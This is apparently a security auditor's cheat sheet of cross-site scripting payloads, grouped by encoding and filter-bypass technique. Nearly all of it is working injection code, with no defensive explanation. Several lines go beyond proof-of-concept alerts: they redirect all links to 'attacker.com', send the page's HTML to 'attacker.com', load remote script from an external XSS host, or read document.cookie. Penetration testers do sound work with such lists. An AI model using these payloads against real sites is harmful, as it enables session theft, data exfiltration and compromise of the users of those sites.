### Dirty XSS payloads that I have collected and used in the audits ###
> Try to use prompt or confirm instead of alert whenever possible. Use URL ENCODE/DOUBLE to play with the payloads. Pay attention that the characters are copied correctly.

**Linux: create a payload into a extension img**
```
touch \<img\ src\=x\ onerror\=prompt\(\'xss\'\)\>.jpg
```
**HREF tag**
```
for(a of document.links)a.href='//attacker.com' 
[].map.call(document.links, l=>l.href='//attacker.com')
"><a href=javascript:prompt(1)>PoC_XSS</a>
"><a href="javascript:confirm%281%29">Clickme</a>
"><a href="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+">click</a>
"><a/href=javascript&colon;co\u006efir\u006d&#40;&quot;1&quot;&#41;>clickme</a>
```
**Simple fetching**
```
a='aler';d=`'XSS'`;b='t('+d+')';c=a+b;eval(c);
a='aler';d='Math.PI';b='t('+d+')';c=a+b;eval(c);
a='aler';d=1;b='t('+d+')';c=a+b;eval(c);
eval('~a~le~rt~~(~~1~~)~'.replace(/~/g, ''))
eval(\'~a~le~rt~~(~~1~~)~\'.replace(/~/g, \'\'))
eval(/~a~le~rt~~(~~1~~)~/.source.replace(/~/g, new String()))
"+/>+%3c%73%63%00%72%69%70%74%3ealert%00(/Red_Team_PoC_XSS/)%3c/%73%63%00%72%69%70%74%3e%22
x=String(/YWxlcnQoInRlc3QiKQ==/);x=x.substring(1,x.length-1);eval(atob(x));
x=g%27;onerror=alert;throw+1//
```
```
<script>
var fn=window[490837..toString(1<<5)];
fn(atob('YWxlcnQoMSk='));
</script>
<script>
var fn=window[String.fromCharCode(101,118,97,108)];
fn(atob('YWxlcnQoMSk='));
</script>
<script>
var fn=window[atob('ZXZhbA==')];
fn(atob('YWxlcnQoMSk='));
</script>
```
**Bypass hidden tags: ALT+SHIFT+X – Windows or CTRL+ALT+X in OSX**
```
<input type="hidden" name="returnurl" value="" accesskey="X" onclick="alert(document.domain)" />
<input type=hidden style=x:expression(alert(1))>
+accesskey="X"+onclick%3d"alert(document.domain)+  //only Firefox
```
**Media tags**
```
<audio oncanplay=alert(1) src="/media/hack-the-planet.mp3" />
<audio ondurationchange=alert(1) src="/media/hack-the-planet.mp3" />
<audio autoplay=true onended=alert(1) src="/media/hack-the-planet.mp3" />
<audio onloadeddata=alert(1) src="/media/hack-the-planet.mp3" />
<audio onloadedmetadata=alert(1) src="/media/hack-the-planet.mp3" />
<audio onloadstart=alert(1) src="/media/hack-the-planet.mp3" />
<audio onprogress=alert(1) src="/media/hack-the-planet.mp3" />
<audio onsuspend=alert(1) src="/media/hack-the-planet.mp3" />
<video oncanplay=alert(1) src="/media/hack-the-planet.mp4" />
<video ondurationchange=alert(1) src="/media/hack-the-planet.mp4" />
<video autoplay=true onended=alert(1) src="/media/hack-the-planet.mp4" />
<video onloadeddata=alert(1) src="/media/hack-the-planet.mp4" />
<video onloadedmetadata=alert(1) src="/media/hack-the-planet.mp4" />
<video onloadstart=alert(1) src="/media/hack-the-planet.mp4" />
<video onprogress=alert(1) src="/media/hack-the-planet.mp4" />
<video onsuspend=alert(1) src="/media/hack-the-planet.mp4" />
wolftein_map_LOL<body onload=E=c.getContext("2d"),setInterval(F="t+=.2,Q=Math.cos;c.height=300;for(x=h;x--;)for(y=h;y--;E.fillRect(x*4,y*4,b-d?4:D/2,D/2))for(D=0;'.'<F[D*y/h-D/2|0?1:(d=t+D*Q(T=x/h-.5+Q(t)/8)&7)|(3.5+D*Q(T-8))<<3]&&D<8;b=d)D+=.1",t=h=75)><canvas id=c>
```
**Some javascript tags bypasses**
```
'`"><\x3Cscript>javascript:alert(1)</script>
(%22%3e%3cimg%20src%3dx%20onerror%3dalert('XSS-RedTeam')%3e)
GET /js9436e<script>alert(1)</script>b657a4849a4/jquery/jquery-1.6.min.js
<script>x=String(/YWxlcnQoInRlc3QiKQ==/);x=x.substring(1,x.length-1);eval(atob(x));</script>
```
**ALERT obfuscation**
```
alert(String.from+CharCode(88, 83, 83))
Payload:
"></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>
Decoded:
%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B
&#97;&#108;&#101;&#114;&#116;
alert
```
**USED IN DOOM JS**
```
'}}alert(1);if(0){{//
';prompt(1);'
// Prints "ABCD" to the console
console.log(String.fromCharCode(65,66,67,68))
// Executes: alert(1)
eval(String.fromCharCode(97,108,101,114,116,40,49,41))
```
```
var x = eval; x('alert(1)')
(eval)    // returns a reference to the eval function
(1, eval) // also returns a reference to the eval function
```
```
(1, eval)('alert(1)') // Executes: alert(1)
eval.call(null, 'alert(1)') // Executes: alert(1)
```
```
function hackThePlanet () {
  alert(1)
}
new Function('alert(1)')()
```
**CALENDARS**
```
"onmouseover="alert(/XSS/)"style="position:absolute;width:100%;height:100%;top:0;left:0;" 
```
**This can be used in Wordpress 5**
```
<script src="http://[PATH]/wp-admin/admin-ajax.php?action=qni_content_index"></script>
<script>
console.log(window.qniContentIndex); // in a real-world attack, this would be send to the attacker's server
</script>
```
**Basic UNICODE encode**
```
"><script>co\u006efir\u006d`1`</script>
"><ScRiPt>co\u006efir\u006d`1`</ScRiPt>
"><img src=x onerror=co\u006efir\u006d`1`>
"><svg/onload=co\u006efir\u006d`1`>
"><iframe/src=javascript:co\u006efir\u006d%281%29>
"><h1 onclick=co\u006efir\u006d(1)>Clickme</h1>
"><a href=javascript:prompt%28 1%29>Clickme</a>
"><a href="javascript:co\u006efir\u006d%28 1%29">Clickme</a>
"><textarea autofocus onfocus=co\u006efir\u006d(1)>
"><details/ontoggle=co\u006efir\u006d`1`>clickmeonchrome
"><p/id=1%0Aonmousemove%0A=%0Aconfirm`1`>hoveme
"><img/src=x%0Aonerror=prompt`1`>
"><iframe srcdoc="&lt;img src&equals;x:x+onerror&equals;alert&lpar;1&rpar;&gt;">
"><h1/ondrag=co\u006efir\u006d`1`)>DragMe</h1>
```
**HTML Encoding**
```
<img src="1″ onerror="alert(1)" />
<img src="1″ onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />
<iframe src="javascript:alert(1)"></iframe>
<iframe src="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;"></iframe>
```
**CSS Hexadecimal Encoding**
```
<div style="x:expression(alert(1))">Joker</div>
<div style="x:\65\78\70\72\65\73\73\69\6f\6e(alert(1))">Joker</div>
<div style="x:\000065\000078\000070\000072\000065\000073\000073\000069\00006f\00006e(alert(1))">Joker</div>
<div style="x:\65\78\70\72\65\73\73\69\6f\6e\028 alert \028 1 \029 \029″>Joker</div>
<script>document.write(‘\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x31\x20\x6F\x6E\x65\x72\x72\x6F\x72\x3D\x61\x6C\x65\x72\x74\x28\x31\x29\x3E’);</script>
<script>document.write(‘\074\151\155\147\040\163\162\143\075\061\040\157\156\145\162\162\157\162\075\141\154\145\162\164\050\061\051\076’);</script>
<script>document.write(‘\u003C\u0069\u006D\u0067\u0020\u0073\u0072\u0063\u003D\u0031\u0020\u006F\u006E\u0065\u0072\u0072\u006F\u0072\u003D\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029\u003E’);</script>
```
**Overlong UTF-8**
```
< = %C0%BC = %E0%80%BC = %F0%80%80%BC
> = %C0%BE = %E0%80%BE = %F0%80%80%BE
‘ = %C0%A7 = %E0%80%A7 = %F0%80%80%A7
" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2
```
**UTF-7 (Missing charset?)**
```
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-
```
**Unicode .NET Ugliness**
```
%uff1cscript%uff1ealert(1)%uff1c/script%uff1e
```
**Classic ASP**
```
%u3008img src="1" onerror="alert(%uFF071%uFF07)"%u232A
and/or Useful features.
<blah style="blah:expression(alert(1))" />
```
**CSS Comments**
```
<div style="z:exp/*anything*/res/*here*/sion(alert(1))" />
JavaScript functions
<script>window[‘alert’](0)</script>
<script>parent[‘alert’](1)</script>
<script>self[‘alert’](2)</script>
<script>top[‘alert’](3)</script>
```
**JavaScript into HTML**
```
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>var junk = ‘</script><script>alert(1)</script>’;</script>
```
**HTML CSS**
```
<style>body { background-image:url(‘http://www.blah.com/</style><script>alert(1)</script>’); }</style>
XML documents
<?xml version="1.0″ ?>
<someElement>
<a xmlns:a=’http://www.w3.org/1999/xhtml’><a:body onload=’alert(1)’/></a>
</someElement>
```
**URI Schemes**
```
<iframe src="vbscript:msgbox(1)"></iframe> (IE)
<iframe src="data:text/html,<script>alert(0)</script>"></iframe> (Firefox, Chrome, Safari)
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe> (Firefox, Chrome, Safari)
<script>eval(location.hash.slice(1))</script>
<script>eval(location.hash)</script> (Firefox)
<script>eval(location.hash.slice(1))</script>#alert(1)
<iframe src="http://target.com/something.jsp?inject=<script>eval(name)</script>" name="alert(1)"></iframe>
```

**A bounch of dirty Payloads**
```
<script>prompt(1);</script>
<script>confirm(1);</script>
<svg onload=confirm(1)>
<body onpageshow=alert(1)>
<style onload=alert(1) />
"><img src=x onerror=prompt(1)>
"><svg/onload=prompt(1)>
"><iframe/src=javascript:prompt(1)>
"><h1 onclick=prompt(1)>Clickme</h1>
"><textarea autofocus onfocus=prompt(1)>
"><h1>TEST>
"><h1>TEST</h1>
<sc<script>ript>alert(1)</sc</script>ript>
<img src=x ononerrorerror=alert(1) />
<script DUMMY_RANDOM>alert(1)</script DUMMY_RANDOM>
<a href=# name=x id=x>Click me on IE11</a>
<script event=onload for=window> return alert(2)};{ //IE11 only </script>
<script event="onclick(blah)<wtfbbq>{}" for=x> blah.view.alert(1) </script> 
<svg/onload="(new Image()).src='//attacker.com/'%2Bdocument.documentElement.innerHTML">//A payload that sends current webpage
'"</Script><Html Onmouseover=(alert)(document.domain) //
javascript:x=´http://x.c´;alert('xss');//
javascript:eval('a=document.createElement(\'script\');a.src=\'https://generaleg.xss.ht\';document.body.appendChild(a)');s='https://s.com'
<img src=1 onerror="alert('Wait. What. IE/Edge')};while(true)sendMeToTheJSBlackHole();function lol(){">
%22>%0a<details%0aopen%0aontoggle%0a=%0aa=prompt,a(document.location)+dummy="
%22>%0a<details/open/ontoggle=a=prompt,a(document.location)+dummy="
Dummy~<"><details/open/ontoggle="jAvAsCrIpT&colon;alert&lpar;/dummy/&rpar;">XXXXX</a>
<script/src=//xss.web></script/src>
<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter><br>
<object/onerror=write`1`//
" ="" '></><script></script><svg onload"="alertonload=alert(1)"" onload=setInterval`alert\x28document.domain\x29`
fileThatDoesNotExist" onerror="javascript:window.onerror=alert;throw 'XSS'" dummyParam="
fileThatDoesNotExist" onerror="location.href='data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4='" dummyParam="
onerror=alert;throw+1;
onerror=eval;throw'=alert\x281\x29';
<svg/onload=t=/aler/.source+/t/.source;window.onerror=window[t];throw+1;//
<input type=TEXT "onfocus='alert(1)'+autofocus="
%22/%3e<input+type=TEXT+onfocus='alert(document.cookie)'+autofocus="
<input type="text" id="search-text" name="query" value="" onfocus="alert(1)" autofocus="" />
<input+type=TEXT%20onfocus='alert(document.cookie)'+autofocus=""
<img+src="https://s3-eu-west-1.amazonaws.com/cyber-custom/theme_3MMnpUMH3Fyx7G9MKywJ/1446646468298_logo"/>
%uff1cscript%uff1ealert('XSS');%uff1c/script%uff1e
%22%3E%3CScRiPt%3Ealert(1)%3C%2FScRiPt%3E
&"%20onclick=prompt(9999)//
<iframe "onload=alert(/XSS/)></iframe>
</ScRipt%20><img%20src=x%20onerror=alert(1)>
%22%3Cimg%20src=x%20onerror=alert(1)%3E
<h1>TEST%20<img%20border="0"
;<img src=x onerror=prompt(/XSS/)>
'onmouseover='confirm(1)'style='position:absolute;width:100%;height:100%;top:0;left:0;'
"/><input%20type="image"%20scr='http%3a%2f%2fwww.example.com/example.jpg'%20alt='user-controlled'%20/>"
"/><input%20type="image"%20scr='http%3a%2f%2fwww.example.com/example.jpg'%20alt='' onload='alert(&apos;xss&apos;)' />
%22%3E%3CXML%20SRC="xsstest.xml"%20ID=I></XML><SPAN%20DATASRC=#I%20DATAFLD=C%20DATAFORMATAS=HTML></SPAN>
"><XML SRC="xsstest.xml" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<a href="testt"%20onmouseover=alert(document.cookie)>XSS_test</a>
<a href="javascript:alert(1337)">Click me</a>
%22%3E%3Ca%20href%3Djavascript%3Aconfirm%28document.cookie%29%3EPoC_XSS%3C%2fa%3E
"><a href=javascript:confirm(document.cookie)>PoC_XSS</a>
<form id="test"></form><button form="test" formaction="javascript:alert(document.cookie)">X</button>
<picture><source srcset="x"><img onerror="alert(1)"></picture>  
<picture><img srcset="x" onerror="alert(1)"></picture>  
<img srcset=",,,,,x" onerror="alert(1)">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<font style='color:expression(alert(document.cookie))'>
<div style='x:expression((window.r==1)?'':eval('r=1;
<img src=′1′ onerror\x00=alert(0) />
<img src=′1′ onerror/=alert(0) />
<img src=′1′ onerror\x0b=alert(0) />
<img src=′1′ onerror=\x00alert(0) />
<\x00img src=′1′ onerror=alert(0) />
<script\x00>alert(1)</script>
<i\x00mg src=’1′ onerror=alert(0) />
<img/src=’1’/onerror=alert(0)>
<img\x0bsrc=’1’\x0bonerror=alert(0)>
<img src=’1”onerror=’alert(0)’>
<img src=’1′”onerror=”alert(0)”>
<img src=’1’\x00onerror=alert(0)>
<img src=’1’onerror=alert(0)>
<script>window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))</script>
<script>this[490837..toString(1<<5)](atob('YWxlcnQoMSk='))</script>
<script>this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][+[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]](++[[]][+[]])</script>
<script>this[(+{}+[])[-~[]]+(![]+[])[-~-~[]]+([][+[]]+[])[-~-~-~[]]+(!![]+[])[-~[]]+(!![]+[])[+[]]]((-~[]+[]))</script>
<script>'str1ng'.replace(/1/,alert)</script>
<script>'bbbalert(1)cccc'.replace(/a\w{4}\(\d\)/,eval)</script>
<script>'a1l2e3r4t6'.replace(/(.).(.).(.).(.).(.)/, function(match,$1,$2,$3,$4,$5) { this[$1+$2+$3+$4+$5](1); })</script>
<script>eval('\\u'+'0061'+'lert(1)')</script>
<script>throw~delete~typeof~prompt(1)</script>
<script>delete[a=alert]/prompt a(1)</script>
<script>delete[a=this[atob('YWxlcnQ=')]]/prompt a(1)</script>
<script>(()=>{return this})().alert(1)</script>
<script>new function(){new.target.constructor('alert(1)')();}</script>
<script>Reflect.construct(function(){new.target.constructor('alert(1)')()},[])</script>
<link/rel=prefetch import href=data:q;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg>
<link rel="import" href="data:x,<script>alert(1)</script>
<script>Array.from`1${alert}3${window}2`</script>
<script>!{x(){alert(1)}}.x()</script>
<script>Array.from`${eval}alert\`1\``</script>
<script>Array.from([1],alert)</script>
<script>Promise.reject("1").then(null,alert)</script>
<svg </onload ="1> (_=alert,_(1)) "">
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
<marquee loop=1 width=0 onfinish=alert(1)>
<p onbeforescriptexecute="alert(1)"><svg><script>\</p>
<img onerror=alert(1) src <u></u>
<videogt;<source onerror=javascript:prompt(911)gt;
<base target="<script>alert(1)</script>"><a href="javascript:name">CLICK</a>
<base href="javascript:/"><a href="**/alert(1)"><base href="javascript:/"><a href="**/alert(1)">
<style>@KeyFrames x{</style><div style=animation-name:x onanimationstart=alert(1)> <
<script>```${``[class extends[alert``]{}]}```</script>
<script>[class extends[alert````]{}]</script>
<script>throw new class extends Function{}('alert(1)')``</script>
<script>x=new class extends Function{}('alert(1)'); x=new x;</script>
<script>new class extends alert(1){}</script>
<script>new class extends class extends class extends class extends alert(1){}{}{}{}</script>
<script>new Image()[unescape('%6f%77%6e%65%72%44%6f%63%75%6d%65%6e%74')][atob('ZGVmYXVsdFZpZXc=')][8680439..toString(30)](1)</script>
<script src=data:,\u006fnerror=\u0061lert(1)></script>
"><svg><script/xlink:href="data:,alert(1)
<svg><script/xlink:href=data:,alert(1)></script>
<frameset/onpageshow=alert(1)>
<div onactivate=alert('Xss') id=xss style=overflow:scroll>
<div onfocus=alert('xx') id=xss style=display:table>
```

